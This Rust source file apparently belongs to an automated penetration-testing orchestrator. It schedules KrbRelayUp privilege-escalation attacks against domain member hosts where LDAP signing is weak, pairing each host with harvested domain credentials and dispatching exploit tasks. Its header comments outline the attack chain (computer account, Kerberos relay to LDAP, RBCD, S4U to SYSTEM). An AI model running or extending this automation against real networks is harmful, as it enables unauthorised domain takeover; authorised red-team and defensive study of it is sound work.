//! auto_krbrelayup -- exploit KrbRelayUp when LDAP signing is not enforced.
//!
//! KrbRelayUp abuses Kerberos authentication relay to LDAP when LDAP signing
//! is not required. It creates a computer account (MAQ > 0), relays Kerberos
//! auth to LDAP to set up RBCD on a target, then uses S4U2Self/S4U2Proxy
//! to get a service ticket as admin. This is a local privilege escalation
//! that works from any authenticated domain user to SYSTEM on domain-joined hosts.
//!
//! Prereqs: LDAP signing NOT enforced (checked by auto_ldap_signing),
//! MAQ > 0 (checked by auto_machine_account_quota), valid domain creds.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dispatches KrbRelayUp exploitation against hosts when LDAP signing is weak.
/// Interval: 45s.
pub async fn auto_krbrelayup(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("krbrelayup") {
            continue;
        }

        let work: Vec<KrbRelayUpWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            // Check if any DC has LDAP signing disabled (vuln registered by auto_ldap_signing)
            let has_ldap_weak = state.discovered_vulnerabilities.values().any(|v| {
                let vtype = v.vuln_type.to_lowercase();
                vtype == "ldap_signing_disabled" || vtype == "ldap_signing_not_required"
            });

            if !has_ldap_weak {
                continue;
            }

            let mut items = Vec::new();

            // Target non-DC hosts (priv esc on member servers)
            for host in &state.hosts {
                if host.is_dc {
                    continue;
                }

                // Skip hosts we already own
                if state.is_processed(DEDUP_SECRETSDUMP, &host.ip) {
                    continue;
                }

                let dedup_key = format!("krbrelayup:{}", host.ip);
                if state.is_processed(DEDUP_KRBRELAYUP, &dedup_key) {
                    continue;
                }

                let domain = host
                    .hostname
                    .find('.')
                    .map(|i| host.hostname[i + 1..].to_lowercase())
                    .unwrap_or_default();

                let cred = state
                    .credentials
                    .iter()
                    .find(|c| !domain.is_empty() && c.domain.to_lowercase() == domain)
                    .or_else(|| state.credentials.first())
                    .cloned();

                let cred = match cred {
                    Some(c) => c,
                    None => continue,
                };

                items.push(KrbRelayUpWork {
                    dedup_key,
                    target_ip: host.ip.clone(),
                    hostname: host.hostname.clone(),
                    domain,
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "krbrelayup",
                "target_ip": item.target_ip,
                "hostname": item.hostname,
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("krbrelayup");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %item.target_ip,
                        hostname = %item.hostname,
                        "KrbRelayUp exploitation dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_KRBRELAYUP, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_KRBRELAYUP, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(target = %item.target_ip, "KrbRelayUp deferred");
                }
                Err(e) => {
                    warn!(err = %e, target = %item.target_ip, "Failed to dispatch KrbRelayUp");
                }
            }
        }
    }
}

struct KrbRelayUpWork {
    dedup_key: String,
    target_ip: String,
    hostname: String,
    domain: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("krbrelayup:{}", "192.168.58.22");
        assert_eq!(key, "krbrelayup:192.168.58.22");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_KRBRELAYUP, "krbrelayup");
    }

    #[test]
    fn ldap_signing_vuln_types() {
        let types = ["ldap_signing_disabled", "ldap_signing_not_required"];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype == "ldap_signing_disabled" || vtype == "ldap_signing_not_required",
                "{t} should match LDAP weak signing"
            );
        }
    }

    #[test]
    fn non_ldap_vuln_types_rejected() {
        let types = ["smb_signing_disabled", "mssql_access"];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype != "ldap_signing_disabled" && vtype != "ldap_signing_not_required",
                "{t} should NOT match LDAP weak signing"
            );
        }
    }

    #[test]
    fn domain_from_hostname() {
        let hostname = "srv01.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "contoso.local");
    }
}
